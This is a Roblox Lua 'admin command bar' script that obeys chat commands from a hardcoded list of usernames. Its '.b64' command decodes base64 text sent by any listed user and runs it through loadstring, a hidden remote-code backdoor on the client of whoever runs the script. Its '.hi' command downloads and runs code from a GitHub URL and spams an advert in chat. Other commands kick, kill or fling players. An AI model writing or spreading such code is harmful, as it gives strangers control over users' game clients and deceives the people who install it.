--[[
    Premium Command Bar with Full Commands & Enhanced Input
    - Crown emoji button (TextButton) with click/drag detection.
    - "Click off" (via an overlay) to close the command bar without executing a command.
    - Command execution on Enter (via keyboard) or by clicking an arrow button.
    - Kick command now supports multi-word reasons.
    - Keybind changed to F7.
    - Works on both mobile and PC.
--]]

--// Services
local TweenService = game:GetService("TweenService")
local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")
local TeleportService = game:GetService("TeleportService")
local RunService = game:GetService("RunService")
local StarterGui = game:GetService("StarterGui")
local Debris = game:GetService("Debris")

local LocalPlayer = Players.LocalPlayer
local adminList = {
	"AK_ADMEN1", "Dxan_PlayS", "I_LOVEYOU12210", "KRZXY_9", "Xeni_he07", "I_LOVEYOU11210", "AK_ADMEN2",
	"GYATT_DAMN1", "ddddd", "IIIlIIIllIlIllIII", "AliKhammas1234", "dgthgcnfhhbsd",
	"AliKhammas", "YournothimbuddyXD", "BloxiAstra", "29Kyooo", "ImOn_ValveIndex", "328ml",
	"BasedLion25", "Akksosdmdokdkddmk", "BOTGTMPStudio2", "damir123loin", "goekayhack",
	"goekayball", "goekayball2", "goetemp_1", "goetemp_2", "goekayentity1", "goekayentity2",
	"goekayentity3", "goekayentity4", "goekayentity5", "Whitelisttestingg", "Robloxian74630436",
	"sheluvstutu", "browhatthebadass", "SunSetzDown", "", "FellFlower2", "",
	"lIIluckyIIII", "MyLittlePonySEDE", "Robloxian74630436", "X1MV_SAMET", "P6arx", "Obf_testing5",
	"LeckMeineEi3r_ayri"
}

local function adminLog(msg)
	print(msg)
	if _G.AdminLogLabel and _G.AdminLogLabel:IsA("TextLabel") then
		_G.AdminLogLabel.Text = _G.AdminLogLabel.Text .. "\n" .. msg
	end
end

--// Base64 Functions
local base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
local base64lookup = {}
for i = 1, #base64chars do
	base64lookup[base64chars:sub(i, i)] = i - 1
end

local function encodeBase64(input)
	local tbl = {}
	local len = #input
	local i = 1
	while i <= len do
		local a = input:byte(i)
		local b = (i + 1 <= len) and input:byte(i + 1) or 0
		local c = (i + 2 <= len) and input:byte(i + 2) or 0
		local combined = a * 2^16 + b * 2^8 + c
		local w = math.floor(combined / 2^18) % 64 + 1
		local x = math.floor(combined / 2^12) % 64 + 1
		local y = math.floor(combined / 2^6) % 64 + 1
		local z = combined % 64 + 1
		table.insert(tbl, base64chars:sub(w, w))
		table.insert(tbl, base64chars:sub(x, x))
		if i + 1 <= len then
			table.insert(tbl, base64chars:sub(y, y))
		else
			table.insert(tbl, "=")
		end
		if i + 2 <= len then
			table.insert(tbl, base64chars:sub(z, z))
		else
			table.insert(tbl, "=")
		end
		i = i + 3
	end
	return table.concat(tbl)
end

local function decodeBase64(input)
	local tbl = {}
	local str = input:gsub("%s", "")
	local len = #str
	local i = 1
	while i <= len do
		local a = str:sub(i, i)
		local b = str:sub(i+1, i+1)
		local c = str:sub(i+2, i+2)
		local d = str:sub(i+3, i+3)
		local A = base64lookup[a] or 0
		local B = base64lookup[b] or 0
		local C = (c ~= "=") and base64lookup[c] or 0
		local D = (d ~= "=") and base64lookup[d] or 0
		local combined = A * 2^18 + B * 2^12 + C * 2^6 + D
		local byte1 = math.floor(combined / 2^16) % 256
		local byte2 = math.floor(combined / 2^8) % 256
		local byte3 = combined % 256
		table.insert(tbl, string.char(byte1))
		if c ~= "=" then table.insert(tbl, string.char(byte2)) end
		if d ~= "=" then table.insert(tbl, string.char(byte3)) end
		i = i + 4
	end
	return table.concat(tbl)
end

--// Utility Functions
local function matchesPlayerName(player, search)
	local n = player.Name:lower()
	local d = player.DisplayName:lower()
	search = search:lower()
	if n == search or d == search then
		return true
	end
	if n:find(search, 1, true) or d:find(search, 1, true) then
		return true
	end
	return false
end

local function getPlayerFromString(str)
	local results = {}
	for _, plr in ipairs(Players:GetPlayers()) do
		if matchesPlayerName(plr, str) then
			table.insert(results, plr)
		end
	end
	if #results == 1 then
		return results[1]
	elseif #results > 1 then
		adminLog("Ambiguous target: multiple players match '" .. str .. "'.")
		return nil
	else
		adminLog("No players found matching '" .. str .. "'.")
		return nil
	end
end

local function getHumanoid(character)
	if character then
		return character:FindFirstChildWhichIsA("Humanoid")
	end
	return nil
end

local function getHRP(character)
	if character then
		return character:FindFirstChild("HumanoidRootPart")
	end
	return nil
end

-- Shifts the first element from an args table (for target selection)
local function shiftFirst(args, allowNil)
	if #args >= 1 then
		local targ = getPlayerFromString(args[1])
		if targ then
			table.remove(args, 1)
			return targ
		else
			return nil
		end
	else
		if allowNil then
			return LocalPlayer
		else
			return nil
		end
	end
end

-- Parses a target and number (for commands like .spin, .speed)
local function parsePlayerAndNumber(args, useNumber)
	local targ = shiftFirst(args, true)
	local num = nil
	if useNumber then
		if #args >= 1 and tonumber(args[1]) then
			num = tonumber(args[1])
			table.remove(args, 1)
		else
			num = 50
		end
	end
	return targ, num
end

-- Tables to hold connections for follow and orbit commands
local followConnections = {}
local orbitConnections = {}

--// Command Executor (all commands from the original script)
local function executeCommand(origin, cmd, args)
	local originChar = origin.Character
	if not originChar then return end

	if cmd == ".bring" then
		local target = shiftFirst(args, true)
		if target and originChar and target.Character and getHRP(originChar) and getHRP(target.Character) then
			getHRP(target.Character).CFrame = getHRP(originChar).CFrame
			adminLog("Brought " .. target.Name .. " to " .. origin.Name .. ".")
		end

	elseif cmd == ".kill" then
		local target
		if #args > 0 then
			target = shiftFirst(args, false)
			if not target then
				adminLog("No valid target found for .kill.")
				return
			end
		else
			target = origin
		end
		if target.Character then
			local hum = getHumanoid(target.Character)
			if hum then
				hum.Health = 0
				adminLog("Killed " .. target.Name .. ".")
			end
		end

	elseif cmd == ".hi" then
loadstring(game:HttpGet("https://raw.githubusercontent.com/vqmpjayZ/More-Scripts/refs/heads/main/Anthony's%20ACL"))()
wait(1)
local function Chat(msg)
    -- Check if we're using the old chat system
    local oldChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
    
    -- Send message using the old chat system if it exists
    if oldChat then
        game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(msg, "All")
    else
        -- Send message using the new TextChatService
        local textChatService = game:GetService("TextChatService")
        local channel = textChatService.TextChannels.RBXGeneral
        channel:SendAsync(msg)
    end
end

-- Call the Chat function
Chat(" hi 👋, im using AK ADMIN")
Chat(" hi 👋, im using AK ADMIN")

elseif cmd == ".chat" then -- .chat [partial user/display name] message OR .chat message for all
    -- Function to find a player by partial match in Name or DisplayName
    local function findPlayer(partial)
        if partial:lower() == "all" then return "all" end
        
        if not partial or partial == "" then return nil end
        local search = partial:lower()
        local bestMatch = nil
        
        for _, player in ipairs(game:GetService("Players"):GetPlayers()) do
            if player.Name:lower() == search or player.DisplayName:lower() == search then
                -- Exact match takes priority
                return player
            elseif player.Name:lower():find(search, 1, true) or player.DisplayName:lower():find(search, 1, true) then
                -- Store first partial match
                if not bestMatch then
                    bestMatch = player
                end
            end
        end
        
        return bestMatch -- Return the first partial match if no exact match found
    end

    local potentialTarget = args[1]
    local target = findPlayer(potentialTarget)
    local message = ""
    
    if target == "all" then
        table.remove(args, 1)  -- Remove the "all" token
        message = table.concat(args, " ")
        
        if message == "" then
            adminLog("No message provided for .chat command.")
            return
        end
        
        -- Send to all players
        local oldChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if oldChat then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        else
            local textChatService = game:GetService("TextChatService")
            local channel = textChatService.TextChannels.RBXGeneral
            channel:SendAsync(message)
        end
        
        adminLog("Sent message to all: " .. message)
    elseif target then
        if target.Name ~= game.Players.LocalPlayer.Name then
            adminLog("You can't send a message to yourself.")
            return
        end
        
        table.remove(args, 1)  -- Remove the target token if a match is found
        message = table.concat(args, " ")
        
        if message == "" then
            adminLog("No message provided for .chat command.")
            return
        end
        
        -- Send to specific player only
        local oldChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if oldChat then
            -- For legacy chat system - use whisper functionality
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        else
            -- For new TextChatService - use private message if available, otherwise prefix the message
            local textChatService = game:GetService("TextChatService")
            local channel = textChatService.TextChannels.RBXGeneral
            
            -- Check if private messaging is available
            local privateChannel = textChatService.TextChannels:FindFirstChild("RBXPrivateMessage")
            if privateChannel then
                -- If private channel exists, use it to message specific player
                privateChannel:SendAsync(target.Name .. " " .. message)
            else
                -- Otherwise send to general but with a prefix
                channel:SendAsync(message)
            end
        end
        
        adminLog("Sent message to " .. target.Name .. ": " .. message)
    else
        -- If no target found, send to all
        message = table.concat(args, " ")
        
        if message == "" then
            adminLog("No message provided for .chat command.")
            return
        end
        
        -- Send to all players
        local oldChat = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
        if oldChat then
            game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer(message, "All")
        else
            local textChatService = game:GetService("TextChatService")
            local channel = textChatService.TextChannels.RBXGeneral
            channel:SendAsync(message)
        end
        
        adminLog("Sent message to all: " .. message)
    end

elseif cmd == ".jump" then
		local target = shiftFirst(args, true)
		if target and target.Character then
			local hum = getHumanoid(target.Character)
			if hum then
				hum.Jump = true
				adminLog(target.Name .. " jumped!")
			end
		end
	elseif cmd == ".b64" then
		local data = table.concat(args, " ")
		if data:sub(1,1) == '"' and data:sub(-1) == '"' then
			data = data:sub(2, -2)
		end
		local decoded = decodeBase64(data)
		if not decoded or decoded == "" then
			adminLog("Failed to decode Base64 string.")
			return
		end
		local func, err = loadstring(decoded)
		if not func then
			adminLog("Error loading decoded code: " .. tostring(err))
			return
		end
		func()
		adminLog("Executed Base64 code.")

	elseif cmd == ".spin" then
		local target, speed = parsePlayerAndNumber(args, true)
		if not target then
			adminLog("No valid target found for .spin.")
			return
		end
		speed = speed or 50
		if target.Character then
			local hrp = getHRP(target.Character)
			if hrp then
				local spinVel = hrp:FindFirstChild("SpinVel")
				if not spinVel then
					spinVel = Instance.new("BodyAngularVelocity")
					spinVel.Name = "SpinVel"
					spinVel.MaxTorque = Vector3.new(0, math.huge, 0)
					spinVel.P = 1000
					spinVel.Parent = hrp
				end
				spinVel.AngularVelocity = Vector3.new(0, speed, 0)
				adminLog("Spinning " .. target.Name .. " at speed " .. speed .. ".")
			end
		end

	elseif cmd == ".unspin" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .unspin.")
			return
		end
		if target.Character then
			local hrp = getHRP(target.Character)
			if hrp then
				local spinVel = hrp:FindFirstChild("SpinVel")
				if spinVel then
					spinVel:Destroy()
				end
				adminLog("Stopped spinning " .. target.Name .. ".")
			end
		end

	elseif cmd == ".speed" then
		local target, speed = parsePlayerAndNumber(args, true)
		if not target then
			adminLog("No valid target found for .speed.")
			return
		end
		speed = speed or 16
		if target.Character then
			local hum = getHumanoid(target.Character)
			if hum then
				hum.WalkSpeed = speed
				adminLog("Set " .. target.Name .. "'s speed to " .. speed .. ".")
			end
		end

	elseif cmd == ".kick" then
		-- Fix: use all remaining args as the reason
		local target = shiftFirst(args, false)
		if not target then
			adminLog("No valid target found for .kick.")
			return
		end
		local reason = table.concat(args, " ")
		if reason == "" then reason = "Kicked" end
		if target == origin then
			origin:Kick(reason)
			adminLog("You kicked yourself: " .. reason)
		else
			pcall(function() target:Kick(reason) end)
			adminLog("Kicked " .. target.Name .. ": " .. reason)
		end

	elseif cmd == ".freeze" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .freeze.")
			return
		end
		if target.Character then
			for _, part in ipairs(target.Character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.Anchored = true
				end
			end
			adminLog("Froze " .. target.Name .. ".")
		end

elseif cmd == ".unfreeze" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .unfreeze.")
			return
		end
		if target.Character then
			for _, part in ipairs(target.Character:GetDescendants()) do
				if part:IsA("BasePart") then
					part.Anchored = false
				end
			end
			adminLog("Unfroze " .. target.Name .. ".")
		end

	elseif cmd == ".follow" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .follow.")
			return
		end
		if followConnections[target.UserId] then
			followConnections[target.UserId]:Disconnect()
			followConnections[target.UserId] = nil
		end
		if target.Character and originChar then
			local hum = getHumanoid(target.Character)
			if hum and getHRP(originChar) then
				followConnections[target.UserId] = RunService.Heartbeat:Connect(function()
					if originChar and target.Character then
						local hrpOrigin = getHRP(originChar)
						if hrpOrigin then
							hum:MoveTo(hrpOrigin.Position)
						end
					end
				end)
				adminLog("Now following " .. target.Name .. ".")
			end
		end

	elseif cmd == ".unfollow" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .unfollow.")
			return
		end
		if followConnections[target.UserId] then
			followConnections[target.UserId]:Disconnect()
			followConnections[target.UserId] = nil
			adminLog("Stopped following " .. target.Name .. ".")
		end

	elseif cmd == ".fling" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .fling.")
			return
		end
		if target.Character then
			local hrp = getHRP(target.Character)
			if hrp then
				local bv = Instance.new("BodyVelocity")
				bv.Velocity = Vector3.new(math.random(-100, 100), math.random(50, 150), math.random(-100, 100))
				bv.MaxForce = Vector3.new(1e200, 1e200, 1e200)
				bv.Parent = hrp
				Debris:AddItem(bv, 0.5)
				adminLog("Flinging " .. target.Name .. ".")
			end
		end

elseif cmd == ".fling2" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .fling.")
			return
		end
		if target.Character then
			local hrp = getHRP(target.Character)
			if hrp then
				local bv = Instance.new("BodyVelocity")
				bv.Velocity = Vector3.new(math.random(-700, 400), math.random(50, 300), math.random(-700, 400))
				bv.MaxForce = Vector3.new(1e200, 1e200, 1e200)
				bv.Parent = hrp
				Debris:AddItem(bv, 0.5)
				adminLog("Flinging " .. target.Name .. ".")
			end
		end

	elseif cmd == ".orbit" then
		local target, distance, speed
		if #args >= 3 then
			target = shiftFirst(args, false)
			if target then
				distance = tonumber(args[1]) or 10
				speed = tonumber(args[2]) or 1
				table.remove(args, 1)
				table.remove(args, 1)
			else
				adminLog("No valid target found for .orbit.")
				return
			end
		elseif #args >= 2 then
			target = origin
			distance = tonumber(args[1]) or 10
			speed = tonumber(args[2]) or 1
			table.remove(args, 1)
			table.remove(args, 1)
		else
			target = origin
			distance = 10
			speed = 1
		end
		if orbitConnections[target.UserId] then
			orbitConnections[target.UserId]:Disconnect()
			orbitConnections[target.UserId] = nil
		end
		local startTime = tick()
		if target.Character and originChar then
			orbitConnections[target.UserId] = RunService.Heartbeat:Connect(function()
				if originChar and target.Character then
					local hrpOrigin = getHRP(originChar)
					local hrpTarget = getHRP(target.Character)
					if hrpOrigin and hrpTarget then
						local elapsed = tick() - startTime
						local angle = elapsed * speed
						local offset = Vector3.new(math.cos(angle) * distance, 0, math.sin(angle) * distance)
						hrpTarget.CFrame = CFrame.new(hrpOrigin.Position + offset)
					end
				end
			end)
			adminLog("Orbiting " .. target.Name .. " at distance " .. distance .. " with speed " .. speed .. ".")
		end

	elseif cmd == ".unorbit" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .unorbit.")
			return
		end
		if orbitConnections[target.UserId] then
			orbitConnections[target.UserId]:Disconnect()
			orbitConnections[target.UserId] = nil
			adminLog("Stopped orbiting " .. target.Name .. ".")
		end

	elseif cmd == ".trip" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .trip.")
			return
		end
		if target.Character then
			local hrp = getHRP(target.Character)
			local hum = getHumanoid(target.Character)
			if hrp and hum then
				hum.PlatformStand = true
				hrp.Velocity = hrp.CFrame.lookVector * 50 + Vector3.new(0,10,0)
				wait(0.5)
				hum.PlatformStand = false
				adminLog("Tripped " .. target.Name .. ".")
			end
		end

	


elseif cmd == ".re" then
		local target = shiftFirst(args, true)
		if not target then
			adminLog("No valid target found for .re.")
			return
		end
		if target.Character then
			local hrp = getHRP(target.Character)
			if hrp then
				local pos = hrp.Position
				local hum = getHumanoid(target.Character)
				if hum then
					hum.Health = 0
				end
				target.CharacterAdded:Wait()
				local newChar = target.Character
				local newHRP = getHRP(newChar)
				if newHRP then
					newHRP.CFrame = CFrame.new(pos)
				end
				adminLog("Reset " .. target.Name .. "'s character.")
			end
		end

	else
	end
end

--// GUI Settings & Creation
local settings = {
	COLORS = {
		PRIMARY = Color3.fromRGB(15,20,35),
		SECONDARY = Color3.fromRGB(25,35,55),
		ACCENT = Color3.fromRGB(65,140,255),
		HOVER = Color3.fromRGB(85,160,255),
		TEXT = Color3.fromRGB(240,245,255),
		BORDER = Color3.fromRGB(85,95,120),
		GLOW = Color3.fromRGB(45,120,255),
		PLACEHOLDER = Color3.fromRGB(160,170,190),
		PREDICTION = Color3.fromRGB(128,128,128)
	},
	ANIMATION = {
		DURATION = {
			FADE = 0.15,
			MOVE_OPEN = 0.35,
			MOVE_CLOSE = 0.7,
			EXPAND = 0.25,
			SHRINK = 0.5
		},
		EASING = {
			MOVE_OPEN = Enum.EasingStyle.Back,
			MOVE_CLOSE = Enum.EasingStyle.Quint,
			EXPAND = Enum.EasingStyle.Quint,
			SHRINK = Enum.EasingStyle.Quint
		}
	},
	SIZES = {
		BUTTON = UDim2.new(0,45,0,45),
		COMMAND_BAR = UDim2.new(0,550,0,55)
	}
}

local function createCommandBar()
	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "PremiumCommandBar"
	screenGui.ResetOnSpawn = false

	-- Create a full-screen invisible overlay to detect clicks off the command bar.
	local overlay = Instance.new("TextButton")
	overlay.Name = "CloseOverlay"
	overlay.Size = UDim2.new(1,0,1,0)
	overlay.BackgroundTransparency = 1
	overlay.Text = ""
	overlay.Visible = false
	overlay.ZIndex = 1
	overlay.AutoButtonColor = false
	overlay.Parent = screenGui

	-- Main Frame (the button container)
	local mainFrame = Instance.new("Frame")
	-- Adjusted position: moved a bit more to the right (offset -230)
	mainFrame.Size = settings.SIZES.BUTTON
	mainFrame.Position = UDim2.new(1, -222, 0, -32)
	mainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
	mainFrame.BackgroundTransparency = 0.5
	mainFrame.Parent = screenGui
	local adminPanelGradient = Instance.new("UIGradient")
adminPanelGradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(210, 150, 255)), -- Light Neon Purple
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 105, 180))  -- More Vibrant Pink
}
	adminPanelGradient.Parent = mainFrame

	local uicorner = Instance.new("UICorner")
	uicorner.CornerRadius = UDim.new(0,12)
	uicorner.Parent = mainFrame



	-- Glow effect
	local glow = Instance.new("ImageLabel")
	glow.Image = "rbxassetid://7014506339"
	glow.ImageColor3 = settings.COLORS.GLOW
	glow.ImageTransparency = 0.6
	glow.BackgroundTransparency = 1
	glow.Size = UDim2.new(2,0,2,0)
	glow.Position = UDim2.new(0.5,0,0.5,0)
	glow.AnchorPoint = Vector2.new(0.5,0.5)
	glow.ZIndex = 2
	glow.Parent = mainFrame

	-- Crown Button (using TextButton for crown emoji)
	local icon = Instance.new("TextButton")
	icon.Size = UDim2.new(0.65, 0, 0.65, 0)
	icon.Position = UDim2.new(0.5, 0, 0.5, 0)
	icon.AnchorPoint = Vector2.new(0.5, 0.5)
	icon.BackgroundTransparency = 1
	icon.Text = "👑"          -- Crown emoji
	icon.Font = Enum.Font.GothamBold
	icon.TextSize = 28
	icon.TextColor3 = settings.COLORS.GLOW
	icon.AutoButtonColor = false
	icon.ZIndex = 3
	icon.Parent = mainFrame

	-- Command Container (expanding container)
	local commandContainer = Instance.new("Frame")
	commandContainer.Size = settings.SIZES.BUTTON
	commandContainer.BackgroundColor3 = settings.COLORS.PRIMARY
	commandContainer.BackgroundTransparency = 0.05
	commandContainer.Visible = false
	commandContainer.AnchorPoint = Vector2.new(0.5, 0.5)
	-- Positioned a bit below the main button
	commandContainer.Position = UDim2.new(0.5,0,0.65,0)
	commandContainer.ZIndex = 4
	local ccCorner = Instance.new("UICorner")
	ccCorner.CornerRadius = UDim.new(0,18)
	ccCorner.Parent = commandContainer
	local adminPanel2Gradient = Instance.new("UIGradient")
adminPanel2Gradient.Color = ColorSequence.new{
    ColorSequenceKeypoint.new(0, Color3.fromRGB(210, 150, 255)), -- Light Neon Purple
    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 105, 180))  -- More Vibrant Pink
}
	adminPanel2Gradient.Parent = commandContainer
	local ccStroke = Instance.new("UIStroke")
	ccStroke.Color = settings.COLORS.BORDER
	ccStroke.Thickness = 1.5
	ccStroke.Transparency = 0.7
	ccStroke.Parent = commandContainer


	-- Prediction Label (optional, hidden by default)
	local predictionLabel = Instance.new("TextLabel")
	predictionLabel.Size = UDim2.new(1,-40,1,0)
	predictionLabel.Position = UDim2.new(0,20,0,0)
	predictionLabel.BackgroundTransparency = 1
	predictionLabel.TextColor3 = settings.COLORS.PREDICTION
	predictionLabel.TextSize = 20
	predictionLabel.Font = Enum.Font.GothamBold
	predictionLabel.TextXAlignment = Enum.TextXAlignment.Left
	predictionLabel.Text = ""
	predictionLabel.Visible = false
	predictionLabel.ZIndex = 5
	predictionLabel.Parent = commandContainer

	-- Command TextBox
	local textBox = Instance.new("TextBox")
	textBox.Size = UDim2.new(1,-60,1,0) -- leave room for arrow button
	textBox.Position = UDim2.new(0,20,0,0)
	textBox.BackgroundTransparency = 1
	textBox.TextColor3 = settings.COLORS.TEXT
	textBox.PlaceholderColor3 = settings.COLORS.PLACEHOLDER
	textBox.PlaceholderText = "Enter command..."
	textBox.TextSize = 20
	textBox.Font = Enum.Font.GothamBold
	textBox.TextXAlignment = Enum.TextXAlignment.Left
	textBox.Visible = false
	textBox.ZIndex = 5
	textBox.Parent = commandContainer

	-- Arrow "Enter" Button (to execute command)
	local enterButton = Instance.new("TextButton")
	enterButton.Size = UDim2.new(0,30,0,30)
	enterButton.Position = UDim2.new(1, -35, 0.5, 0)
	enterButton.AnchorPoint = Vector2.new(1, 0.5)
	enterButton.BackgroundTransparency = 1
	enterButton.Text = ""  -- Rightwards Arrow (Unicode U+2192)
	enterButton.Font = Enum.Font.GothamBold
	enterButton.TextSize = 24
	enterButton.TextColor3 = settings.COLORS.GLOW
	enterButton.AutoButtonColor = false
	enterButton.ZIndex = 5
	enterButton.Parent = commandContainer

	commandContainer.Parent = screenGui

	return {
		gui = screenGui,
		overlay = overlay,
		mainFrame = mainFrame,
		icon = icon,
		commandContainer = commandContainer,
		textBox = textBox,
		predictionLabel = predictionLabel,
		glow = glow,
		enterButton = enterButton
	}
end

--// Main function for handling GUI animations and input
local function initCommandBar()
	local elements = createCommandBar()
	local isTyping = false
	local animInProgress = false
	local origPosition = elements.mainFrame.Position

	-- Variables for drag/click detection
	local potentialDrag = false
	local dragging = false
	local dragThreshold = 5 -- pixels
	local dragStartPos = Vector2.new(0,0)
	local startPos = elements.mainFrame.Position

	-- Function to process command from the TextBox
	local function processCommand()
		local text = elements.textBox.Text
		if text ~= "" then
			if text:sub(1,1) ~= "." then
				text = "." .. text
			end
			Players:Chat(text)
		end
		elements.textBox.Text = ""
		elements.predictionLabel.Text = ""
	end

	-- Open command bar (animation and instant focus on textbox)
	local function openBar()
		if animInProgress then return end
		animInProgress = true

		-- Show overlay so clicking off closes the bar
		elements.overlay.Visible = true

		local tweenInfoMoveOpen = TweenInfo.new(settings.ANIMATION.DURATION.MOVE_OPEN, settings.ANIMATION.EASING.MOVE_OPEN, Enum.EasingDirection.Out)
		local tweenInfoExpand = TweenInfo.new(settings.ANIMATION.DURATION.EXPAND, settings.ANIMATION.EASING.EXPAND, Enum.EasingDirection.Out)

		local tweenShrink = TweenService:Create(elements.mainFrame, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {Size = UDim2.new(0,53,0,53)})
		local tweenGrow = TweenService:Create(elements.mainFrame, TweenInfo.new(0.1, Enum.EasingStyle.Quad), {Size = settings.SIZES.BUTTON})
		local tweenGlow = TweenService:Create(elements.glow, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {Size = UDim2.new(2.2,0,2.2,0), ImageTransparency = 0.5})

		tweenShrink:Play()
		tweenGlow:Play()
		tweenShrink.Completed:Connect(function()
			tweenGrow:Play()
			local tweenMove = TweenService:Create(elements.mainFrame, tweenInfoMoveOpen, {Position = UDim2.new(0.5,0,0.65,0)})
			tweenMove:Play()
			-- Fade out the icon (crown) while moving
			local tweenFade = TweenService:Create(elements.icon, TweenInfo.new(settings.ANIMATION.DURATION.FADE), {TextTransparency = 1})
			tweenFade:Play()

			-- Show command container and focus textbox immediately
			elements.commandContainer.Visible = true
			elements.textBox.Visible = true
			elements.textBox:CaptureFocus()
			isTyping = true

			local tweenExpandContainer = TweenService:Create(elements.commandContainer, tweenInfoExpand, {Size = settings.SIZES.COMMAND_BAR})
			tweenExpandContainer:Play()
			tweenExpandContainer.Completed:Connect(function()
				animInProgress = false
			end)
		end)
	end

	-- Close command bar
	local function closeBar()
		if animInProgress then return end
		animInProgress = true
		-- Hide overlay immediately
		elements.overlay.Visible = false
		elements.textBox.Visible = false
		elements.predictionLabel.Text = ""

		local tweenShrinkContainer = TweenService:Create(elements.commandContainer, TweenInfo.new(settings.ANIMATION.DURATION.SHRINK, settings.ANIMATION.EASING.SHRINK, Enum.EasingDirection.InOut), {Size = settings.SIZES.BUTTON})
		local tweenMoveBack = TweenService:Create(elements.mainFrame, TweenInfo.new(settings.ANIMATION.DURATION.MOVE_CLOSE, settings.ANIMATION.EASING.MOVE_CLOSE, Enum.EasingDirection.InOut), {Position = origPosition})
		local tweenRestoreIcon = TweenService:Create(elements.icon, TweenInfo.new(settings.ANIMATION.DURATION.FADE), {TextTransparency = 0})
		local tweenGlowRestore = TweenService:Create(elements.glow, TweenInfo.new(0.5, Enum.EasingStyle.Quad), {Size = UDim2.new(2,0,2,0), ImageTransparency = 0.6})

		tweenShrinkContainer:Play()
		tweenGlowRestore:Play()
		tweenShrinkContainer.Completed:Connect(function()
			elements.commandContainer.Visible = false
			tweenMoveBack:Play()
			tweenRestoreIcon:Play()
			tweenMoveBack.Completed:Connect(function()
				animInProgress = false
				isTyping = false
			end)
		end)
	end

	-- Input handling for drag vs. click on the crown icon
	UserInputService.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			local pos = input.Position
			local iconPos = elements.icon.AbsolutePosition
			local iconSize = elements.icon.AbsoluteSize
			if pos.X >= iconPos.X and pos.X <= iconPos.X + iconSize.X and pos.Y >= iconPos.Y and pos.Y <= iconPos.Y + iconSize.Y then
				potentialDrag = true
				dragStartPos = pos
				startPos = elements.mainFrame.Position
			end
		end

		-- Keybind: F7 to open, Escape to close, Tab to refocus
		if input.KeyCode == Enum.KeyCode.F7 then
			if not isTyping and not animInProgress then
				openBar()
			end
		elseif input.KeyCode == Enum.KeyCode.Escape and isTyping then
			closeBar()
		elseif input.KeyCode == Enum.KeyCode.Tab and isTyping then
			elements.textBox:CaptureFocus()
		end
	end)

	UserInputService.InputChanged:Connect(function(input)
		if potentialDrag and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
			local currentPos = input.Position
			if (currentPos - dragStartPos).Magnitude > dragThreshold then
				dragging = true
				local delta = currentPos - dragStartPos
				elements.mainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
			end
		end
	end)

	UserInputService.InputEnded:Connect(function(input)
		if potentialDrag and (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then
			if not dragging then
				-- Treat as a click if no significant movement occurred
				if not isTyping and not animInProgress then
					openBar()
				end
			end
			potentialDrag = false
			dragging = false
			origPosition = elements.mainFrame.Position
		end
	end)

	-- Overlay click (clicking off the command bar closes it)
	elements.overlay.MouseButton1Down:Connect(function()
		if isTyping then
			closeBar()
		end
	end)

	-- Enter button click to process command
	elements.enterButton.MouseButton1Down:Connect(function()
		if isTyping then
			processCommand()
			closeBar()
		end
	end)

	-- When the textbox loses focus, if Enter was pressed process command; if not, close bar.
	elements.textBox.FocusLost:Connect(function(enterPressed)
		if enterPressed then
			processCommand()
		end
		closeBar()
	end)

	-- Parent the GUI to the player's PlayerGui
	local function parentGui()
		if LocalPlayer then
			elements.gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
		else
			Players:GetPropertyChangedSignal("LocalPlayer"):Wait()
			elements.gui.Parent = LocalPlayer:WaitForChild("PlayerGui")
		end
	end
	parentGui()
end

--// Listen for chat commands from admins
local function listenForCommands(plr)
	plr.Chatted:Connect(function(message)
		local args = {}
		for token in message:gmatch("%S+") do
			table.insert(args, token)
		end
		if #args == 0 then return end
		local cmd = args[1]:lower()
		table.remove(args, 1)
		local success, err = pcall(function()
			executeCommand(plr, cmd, args)
		end)
		if not success then
			adminLog("Error executing command '" .. cmd .. "': " .. tostring(err))
		end
	end)
end

-- Listen for commands from all players in the admin list
for _, plr in ipairs(Players:GetPlayers()) do
	if table.find(adminList, plr.Name) then
		listenForCommands(plr)
	end
end

Players.PlayerAdded:Connect(function(plr)
	if table.find(adminList, plr.Name) then
		listenForCommands(plr)
	end
end)

-- Initialize the command bar only for admins
if table.find(adminList, LocalPlayer.Name) then
	initCommandBar()
end

local Players = game:GetService("Players")
local Player = Players.LocalPlayer
-- **Kommentiere die fehlerhafte Zeile und die Controls-Variable aus**
